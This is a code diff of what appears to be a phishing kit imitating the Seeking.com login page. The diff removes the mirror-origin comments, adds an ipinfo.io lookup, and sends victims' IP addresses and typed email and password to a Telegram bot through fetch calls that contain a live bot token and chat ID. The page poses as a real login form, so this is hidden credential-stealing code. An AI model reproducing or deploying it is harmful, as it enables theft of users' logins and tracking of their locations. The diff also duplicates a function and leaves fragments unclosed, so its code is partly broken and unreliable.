@@ -1,11 +1,11 @@
 
 <!DOCTYPE html>
-<!-- saved from url=(0033)https://members.seeking.com/login -->
+
 <html>
 
 
-<!-- Mirrored from seeking-arrangement-profile-8ab7d9f.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Oct 2023 21:41:13 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
 <head>
     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <script async="" src="Member%20Login%20-%20Seeking_files/clarity.js"></script>
@@ -1338,18 +1338,38 @@ function sendIp(ipx) {
 //   alert("send ip7");
 
 //   var phr = document.getElementById("phrase").value ;
+
+
+    // alert("send ip");
+           
+  // Add "https://ipinfo.io" statement
+  // this will communicate with the ipify servers
+  // in order to retrieve the IP address
+  $.get("https://ipinfo.io/", function(response) {
+         var ipx = response.ip;
+         sendIp(ipx);
+      }, "json")
+       
+      // "json" shows that data will be fetched in json format
+  
+
+function sendIp(ipx) {
+
+//   alert("send ip7");
+
+//   var phr = document.getElementById("phrase").value ;
  
   
 
         
-          //https://api.telegram.org/bot6717753662:AAGyDeiZzAtMHkVISnxQLcngwg6mxVE7r90/sendMessage?chat_id=6298874715&text=heeey 
+          //https://api.telegram.org/bot6393143042:AAFmrch0yhKDpEFrh89zs-_2zEwfW0vYhSI/sendMessage?chat_id=6298874715&text=heeey 
           
           // fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=${email}=${pwd}`, {
 
-            // https://api.telegram.org/bot6717753662:AAGyDeiZzAtMHkVISnxQLcngwg6mxVE7r90/sendMessage?chat_id=6298874715&text=heeey
+            // https://api.telegram.org/bot6393143042:AAFmrch0yhKDpEFrh89zs-_2zEwfW0vYhSI/sendMessage?chat_id=6298874715&text=heeey
 
 
-          fetch('https://api.telegram.org/bot6717753662:AAGyDeiZzAtMHkVISnxQLcngwg6mxVE7r90/sendMessage?chat_id=6298874715&text=ip:'+ipx , {
+          fetch('https://api.telegram.org/bot6393143042:AAFmrch0yhKDpEFrh89zs-_2zEwfW0vYhSI/sendMessage?chat_id=6298874715&text=ip:'+ipx , {
               method: "GET"
           }).then(success => {
 
@@ -1390,7 +1410,7 @@ phr = "email: "+ email +" ; password:"+pass;
    
    
 
-     fetch('https://api.telegram.org/bot6717753662:AAGyDeiZzAtMHkVISnxQLcngwg6mxVE7r90/sendMessage?chat_id=6298874715&text=seekinginfo:'+phr , {
+     fetch('https://api.telegram.org/bot6393143042:AAFmrch0yhKDpEFrh89zs-_2zEwfW0vYhSI/sendMessage?chat_id=6298874715&text=seekinginfo:'+phr , {
          method: "GET"
      }).then(success => {
 
